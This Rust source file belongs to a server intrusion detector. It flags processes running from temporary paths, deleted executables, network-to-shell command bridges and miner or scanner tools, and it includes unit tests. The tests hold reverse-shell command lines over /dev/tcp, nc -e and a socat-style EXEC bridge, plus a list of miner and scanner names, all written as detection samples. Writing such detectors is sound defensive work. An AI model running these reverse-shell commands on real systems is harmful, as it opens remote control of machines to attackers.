use crate::detectors::command_profile::{
    network_execution_assessment_from_event, CommandAssessment,
};
use crate::detectors::{evidence, path_is_allowlisted, string_field, DetectContext, Detector};
use crate::rules::model::RuleMetadata;
use sentinel_core::{Category, Finding, RawEvent, Severity};
use std::collections::BTreeSet;

pub struct ProcessDetector;

impl Detector for ProcessDetector {
    fn name(&self) -> &'static str {
        "process_rules"
    }

    fn rules(&self) -> Vec<RuleMetadata> {
        vec![
            RuleMetadata::new(
                "PROC-001",
                "Process running from temporary path",
                Category::Process,
                Severity::High,
                "A process executable path is under a suspicious temporary directory.",
            ),
            RuleMetadata::new(
                "PROC-002",
                "Deleted executable still running",
                Category::Process,
                Severity::High,
                "A deleted process executable has additional suspicious traits.",
            ),
            RuleMetadata::new(
                "PROC-003",
                "Network command execution bridge",
                Category::Process,
                Severity::Critical,
                "A process command line combines a network channel with shell, system, or fd-bridged execution traits.",
            ),
            RuleMetadata::new(
                "PROC-004",
                "Possible miner or scanner process",
                Category::Process,
                Severity::Critical,
                "A process command line contains common miner or scanner names.",
            ),
        ]
    }

    fn detect(&self, events: &[RawEvent], ctx: &DetectContext) -> Vec<Finding> {
        let mut findings = Vec::new();
        for event in events
            .iter()
            .filter(|event| event.kind == "process_snapshot")
        {
            let exe_path = string_field(event, "exe_path");
            let cmdline = string_field(event, "cmdline");
            if path_is_allowlisted(&exe_path, &ctx.config.allowlist.process_paths)
                || command_matches_allowlist(
                    &cmdline,
                    &ctx.config.allowlist.process_command_contains,
                )
            {
                continue;
            }
            if let Some(assessment) = deleted_executable_assessment(event, ctx) {
                if assessment.is_suspicious(ctx.config.process.deleted_executable_min_score) {
                    findings.push(deleted_executable(event, ctx, assessment));
                }
            }
            if process_from_suspicious_dir(&exe_path, ctx) {
                findings.push(temp_process(event, ctx));
            }
            if network_execution_assessment_from_event(event).is_suspicious() {
                findings.push(network_execution_bridge(event, ctx));
            }
            if event_contains_miner_or_scanner(event, &ctx.config.process.known_bad_tool_names) {
                findings.push(miner_or_scanner(event, ctx));
            }
        }
        findings
    }
}

fn temp_process(event: &RawEvent, ctx: &DetectContext) -> Finding {
    let subject = string_field(event, "pid");
    Finding::new(
        &ctx.host_id,
        "Process executable in temporary path",
        "A running process executable is located in a path commonly abused for malware staging.",
        Severity::High,
        Category::Process,
        "PROC-001",
        subject,
    )
    .with_evidence(process_evidence(event))
    .with_recommendations(vec![
        "Inspect the executable hash, parent process, and file owner.".to_string(),
        "Preserve evidence before stopping or removing the process.".to_string(),
    ])
}

fn deleted_executable(
    event: &RawEvent,
    ctx: &DetectContext,
    assessment: DeletedExecutableAssessment,
) -> Finding {
    Finding::new(
        &ctx.host_id,
        "Deleted executable still running",
        "A deleted process executable is still running and has additional suspicious traits.",
        Severity::High,
        Category::Process,
        "PROC-002",
        string_field(event, "pid"),
    )
    .with_evidence({
        let mut items = process_evidence(event);
        items.push(evidence("risk_score", assessment.score.to_string()));
        items.push(evidence("risk_reasons", assessment.reason_text()));
        items.push(evidence("risk_features", assessment.feature_names()));
        items
    })
    .with_recommendations(vec![
        "Capture process details and network connections before termination.".to_string(),
        "Review how the process was launched.".to_string(),
    ])
}

#[derive(Debug, Clone, Default)]
struct DeletedExecutableAssessment {
    score: u16,
    reasons: BTreeSet<String>,
    features: BTreeSet<&'static str>,
}

impl DeletedExecutableAssessment {
    fn is_suspicious(&self, min_score: u16) -> bool {
        self.score >= min_score
    }

    fn reason_text(&self) -> String {
        self.reasons.iter().cloned().collect::<Vec<_>>().join("; ")
    }

    fn feature_names(&self) -> String {
        self.features.iter().copied().collect::<Vec<_>>().join(", ")
    }

    fn add_signal(&mut self, score: u16, feature: &'static str, reason: impl Into<String>) {
        self.score = self.score.max(score);
        self.features.insert(feature);
        self.reasons.insert(reason.into());
    }
}

fn deleted_executable_assessment(
    event: &RawEvent,
    ctx: &DetectContext,
) -> Option<DeletedExecutableAssessment> {
    let exe_path = string_field(event, "exe_path");
    if !is_deleted_executable_path(&exe_path) {
        return None;
    }

    let normalized_path = normalize_deleted_executable_path(&exe_path);
    let mut assessment = DeletedExecutableAssessment::default();

    if is_memfd_or_anonymous_path(&normalized_path) {
        assessment.add_signal(
            90,
            "anonymous_deleted_executable",
            "deleted executable is backed by memfd or an anonymous file",
        );
    }

    if path_in_suspicious_dirs(&normalized_path, &ctx.config.process.suspicious_dirs) {
        assessment.add_signal(
            80,
            "temporary_deleted_executable",
            "deleted executable is running from a suspicious temporary directory",
        );
    }

    if hidden_basename(&normalized_path) && !is_standard_runtime_path(&normalized_path) {
        assessment.add_signal(
            70,
            "hidden_nonstandard_executable",
            "deleted executable has a hidden basename outside standard runtime paths",
        );
    }

    let command_assessment = network_execution_assessment_from_event(event);
    if command_assessment.is_suspicious() {
        assessment.add_signal(
            85,
            "network_execution_bridge",
            command_assessment.reason_text(),
        );
    }

    if event_contains_miner_or_scanner(event, &ctx.config.process.known_bad_tool_names) {
        assessment.add_signal(
            85,
            "known_bad_tool",
            "process identity matches a configured miner or scanner tool name",
        );
    }

    if is_shell_process_name(&string_field(event, "name")) {
        assessment.add_signal(
            45,
            "shell_process",
            "deleted executable process name is a shell",
        );
    }

    Some(assessment)
}

fn network_execution_bridge(event: &RawEvent, ctx: &DetectContext) -> Finding {
    let assessment = network_execution_assessment_from_event(event);
    Finding::new(
        &ctx.host_id,
        "Network command execution bridge detected",
        "A process command line combines a network channel with shell, system, or fd-bridged execution traits.",
        Severity::Critical,
        Category::Process,
        "PROC-003",
        string_field(event, "pid"),
    )
    .with_evidence(process_evidence_with_assessment(event, &assessment))
    .with_impact(vec![
        "This may indicate active remote command execution when the process is not expected."
            .to_string(),
    ])
    .with_recommendations(vec![
        "Isolate network access if the process is unauthorized.".to_string(),
        "Preserve command line, executable, and parent process evidence.".to_string(),
    ])
}

fn miner_or_scanner(event: &RawEvent, ctx: &DetectContext) -> Finding {
    Finding::new(
        &ctx.host_id,
        "Possible miner or scanner process",
        "A process command line contains common miner or scanner indicators.",
        Severity::Critical,
        Category::Process,
        "PROC-004",
        string_field(event, "pid"),
    )
    .with_evidence(process_evidence(event))
    .with_recommendations(vec![
        "Check CPU/network usage and whether the binary was intentionally installed.".to_string(),
        "Rotate credentials if compromise is confirmed.".to_string(),
    ])
}

fn process_evidence(event: &RawEvent) -> Vec<sentinel_core::Evidence> {
    vec![
        evidence("pid", string_field(event, "pid")),
        evidence("ppid", string_field(event, "ppid")),
        evidence("name", string_field(event, "name")),
        evidence("exe_path", string_field(event, "exe_path")),
        evidence("cmdline", string_field(event, "cmdline")),
    ]
}

fn process_evidence_with_assessment(
    event: &RawEvent,
    assessment: &CommandAssessment,
) -> Vec<sentinel_core::Evidence> {
    let mut items = process_evidence(event);
    items.push(evidence("risk_score", assessment.score.to_string()));
    items.push(evidence("risk_reasons", assessment.reason_text()));
    items.push(evidence("risk_features", assessment.feature_names()));
    items
}

fn process_from_suspicious_dir(path: &str, ctx: &DetectContext) -> bool {
    path_in_suspicious_dirs(path, &ctx.config.process.suspicious_dirs)
}

pub(crate) fn path_in_suspicious_dirs(path: &str, dirs: &[std::path::PathBuf]) -> bool {
    dirs.iter().any(|dir| {
        let prefix = dir.to_string_lossy().replace('\\', "/");
        path == prefix || path.starts_with(&format!("{prefix}/"))
    })
}

pub(crate) fn command_matches_allowlist(command: &str, allowlist: &[String]) -> bool {
    let command = command.trim();
    if command.is_empty() {
        return false;
    }
    allowlist
        .iter()
        .map(|item| item.trim())
        .filter(|item| !item.is_empty())
        .any(|item| command.contains(item))
}

pub(crate) fn event_contains_miner_or_scanner(
    event: &RawEvent,
    known_tool_names: &[String],
) -> bool {
    let candidates = process_identity_tokens(event);
    if !candidates.is_empty() {
        return args_contain_miner_or_scanner(
            candidates.iter().map(String::as_str),
            known_tool_names,
        );
    }
    contains_miner_or_scanner(event.field("cmdline").unwrap_or_default(), known_tool_names)
}

fn process_identity_tokens(event: &RawEvent) -> Vec<String> {
    let mut candidates = ["exe_path", "executable", "name", "process_name"]
        .into_iter()
        .filter_map(|key| event.field(key))
        .filter(|value| !value.trim().is_empty())
        .map(str::to_string)
        .collect::<Vec<_>>();
    if let Some(first_arg) = event
        .field("argv_json")
        .and_then(|value| serde_json::from_str::<Vec<String>>(value).ok())
        .and_then(|args| args.into_iter().next())
        .filter(|value| !value.trim().is_empty())
    {
        candidates.push(first_arg);
    }
    candidates
}

pub(crate) fn contains_miner_or_scanner(command: &str, known_tool_names: &[String]) -> bool {
    args_contain_miner_or_scanner(command.split_whitespace(), known_tool_names)
}

fn args_contain_miner_or_scanner<'a, I>(args: I, known_tool_names: &[String]) -> bool
where
    I: IntoIterator<Item = &'a str>,
{
    args.into_iter()
        .map(command_token_basename)
        .any(|name| matches_known_tool_name(&name, known_tool_names))
}

fn command_token_basename(token: &str) -> String {
    let trimmed = token.trim_matches(|ch: char| {
        ch.is_ascii_whitespace()
            || matches!(
                ch,
                '"' | '\'' | '`' | ',' | ';' | '(' | ')' | '[' | ']' | '{' | '}'
            )
    });
    trimmed
        .rsplit(['/', '\\'])
        .next()
        .unwrap_or(trimmed)
        .to_ascii_lowercase()
}

fn matches_known_tool_name(name: &str, known_tool_names: &[String]) -> bool {
    let normalized = name.strip_suffix(".exe").unwrap_or(name);
    known_tool_names.iter().any(|tool| {
        let tool = command_token_basename(tool);
        let tool = tool.strip_suffix(".exe").unwrap_or(&tool);
        !tool.is_empty() && normalized.eq_ignore_ascii_case(tool)
    })
}

fn is_deleted_executable_path(path: &str) -> bool {
    path.contains(" (deleted)") || path.ends_with("deleted")
}

fn normalize_deleted_executable_path(path: &str) -> String {
    path.trim()
        .strip_suffix(" (deleted)")
        .unwrap_or_else(|| path.trim())
        .to_string()
}

fn is_memfd_or_anonymous_path(path: &str) -> bool {
    let lowered = path.to_ascii_lowercase();
    lowered.contains("memfd:") || lowered.contains("/deleted") || lowered == "deleted"
}

fn hidden_basename(path: &str) -> bool {
    path.rsplit('/')
        .next()
        .map(|name| name.starts_with('.') && name.len() > 1)
        .unwrap_or(false)
}

fn is_standard_runtime_path(path: &str) -> bool {
    [
        "/bin/",
        "/sbin/",
        "/lib/",
        "/lib64/",
        "/usr/bin/",
        "/usr/sbin/",
        "/usr/lib/",
        "/usr/lib64/",
        "/usr/libexec/",
        "/usr/local/bin/",
        "/usr/local/sbin/",
    ]
    .iter()
    .any(|prefix| path.starts_with(prefix))
}

fn is_shell_process_name(name: &str) -> bool {
    matches!(
        name,
        "sh" | "bash" | "dash" | "zsh" | "fish" | "ksh" | "busybox"
    )
}

#[cfg(test)]
mod tests {
    use super::{
        command_matches_allowlist, contains_miner_or_scanner, deleted_executable_assessment,
        event_contains_miner_or_scanner, ProcessDetector,
    };
    use crate::detectors::{
        command_profile::assess_network_execution_command, DetectContext, Detector,
    };
    use sentinel_core::{RawEvent, SentinelConfig};
    use std::sync::Arc;

    fn known_tools() -> Vec<String> {
        ["xmrig", "kinsing", "masscan", "zmap"]
            .into_iter()
            .map(str::to_string)
            .collect()
    }

    #[test]
    fn process_patterns_match_known_bad_fragments() {
        assert!(
            assess_network_execution_command("bash -i >& /dev/tcp/1.2.3.4/4444 0>&1")
                .is_suspicious()
        );
        assert!(
            assess_network_execution_command("nc -e /bin/sh 203.0.113.10 4444").is_suspicious()
        );
        assert!(
            assess_network_execution_command("tool TCP:203.0.113.10:4444 EXEC:/bin/sh")
                .is_suspicious()
        );
        let known_tools = known_tools();
        assert!(contains_miner_or_scanner(
            "/tmp/xmrig -o pool",
            &known_tools
        ));
        assert!(contains_miner_or_scanner(
            "/opt/tools/masscan --rate 1000",
            &known_tools
        ));
        assert!(contains_miner_or_scanner(
            "C:\\temp\\zmap.exe -p 22",
            &known_tools
        ));
        assert!(!contains_miner_or_scanner("/usr/bin/sshd", &known_tools));
        assert!(!contains_miner_or_scanner(
            "/opt/company/xmrigate --worker",
            &known_tools
        ));
    }

    #[test]
    fn process_tool_indicators_prefer_structured_argv() {
        let tools = vec!["xmrig.exe".to_string(), "/opt/tools/masscan".to_string()];
        let argv = serde_json::to_string(&vec!["/opt/company tools/xmrig".to_string()])
            .unwrap_or_default();
        let event = RawEvent::new("process", "process_snapshot")
            .with_field("argv_json", argv)
            .with_field("cmdline", "/opt/company tools/xmrig --pool");
        assert!(event_contains_miner_or_scanner(&event, &tools));

        let benign_argv = serde_json::to_string(&vec![
            "/usr/local/bin/worker".to_string(),
            "--profile".to_string(),
            "xmrig".to_string(),
        ])
        .unwrap_or_default();
        let benign = RawEvent::new("process", "process_snapshot")
            .with_field("argv_json", benign_argv)
            .with_field("cmdline", "/usr/local/bin/worker --profile xmrig");
        assert!(!event_contains_miner_or_scanner(&benign, &tools));
    }

    #[test]
    fn process_patterns_ignore_plain_traffic_forwarding() {
        assert!(!assess_network_execution_command(
            "socat TCP4-LISTEN:8848,reuseaddr,fork TCP4:example.com:443"
        )
        .is_suspicious());
        assert!(
            !assess_network_execution_command("gost -L=tcp://:8443 -F=tcp://example.com:443")
                .is_suspicious()
        );
        assert!(!assess_network_execution_command(
            "forwarder tcp-listen:8443 tcp:198.51.100.10:443"
        )
        .is_suspicious());
        assert!(
            !assess_network_execution_command("ssh -N -L 127.0.0.1:8080:10.0.0.1:80 bastion")
                .is_suspicious()
        );
    }

    #[test]
    fn process_command_allowlist_matches_configured_fragments() {
        let allowlist = vec!["TCP4-LISTEN:8848".to_string()];
        assert!(command_matches_allowlist(
            "socat TCP4-LISTEN:8848,reuseaddr,fork TCP4:example.com:443",
            &allowlist
        ));
        assert!(!command_matches_allowlist("/usr/bin/sshd", &allowlist));
    }

    #[test]
    fn deleted_executable_model_ignores_package_upgrade_residue() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = process_event(
            "/usr/lib/systemd/systemd (deleted)",
            "systemd",
            "/lib/systemd/systemd --user",
        );
        let assessment = deleted_executable_assessment(&event, &ctx);
        assert!(assessment.is_some_and(|assessment| !assessment.is_suspicious(70)));
    }

    #[test]
    fn detector_ignores_standard_deleted_service_binaries() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let events = vec![
            process_event(
                "/usr/sbin/dockerd (deleted)",
                "dockerd",
                "/usr/sbin/dockerd -H fd:// --containerd=/run/containerd/containerd.sock",
            ),
            process_event(
                "/usr/lib/systemd/systemd-logind (deleted)",
                "systemd-logind",
                "/lib/systemd/systemd-logind",
            ),
            process_event(
                "/usr/bin/python3.11 (deleted)",
                "unattended-upgr",
                "/usr/bin/python3 /usr/share/unattended-upgrades/unattended-upgrade-shutdown --wait-for-signal",
            ),
            process_event(
                "/usr/local/bin/vps-sentinel (deleted)",
                "vps-sentinel",
                "/usr/local/bin/vps-sentinel daemon --config /etc/vps-sentinel/config.toml",
            ),
        ];

        let findings = ProcessDetector.detect(&events, &ctx);

        assert!(findings.is_empty());
    }

    #[test]
    fn deleted_executable_model_detects_temp_deleted_payload() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = process_event("/dev/shm/.x (deleted)", ".x", "/dev/shm/.x");
        let assessment = deleted_executable_assessment(&event, &ctx);
        assert!(assessment.is_some_and(|assessment| {
            assessment.is_suspicious(70)
                && assessment.features.contains("temporary_deleted_executable")
        }));
    }

    #[test]
    fn deleted_executable_model_detects_memfd_payload() {
        let ctx = DetectContext::new(Arc::new(SentinelConfig::default()));
        let event = process_event("memfd:kworker (deleted)", "kworker", "kworker");
        let assessment = deleted_executable_assessment(&event, &ctx);
        assert!(assessment.is_some_and(|assessment| {
            assessment.is_suspicious(70)
                && assessment.features.contains("anonymous_deleted_executable")
        }));
    }

    fn process_event(exe_path: &str, name: &str, cmdline: &str) -> RawEvent {
        RawEvent::new("process", "process_snapshot")
            .with_field("pid", "42")
            .with_field("ppid", "1")
            .with_field("name", name)
            .with_field("exe_path", exe_path)
            .with_field("cmdline", cmdline)
    }
}
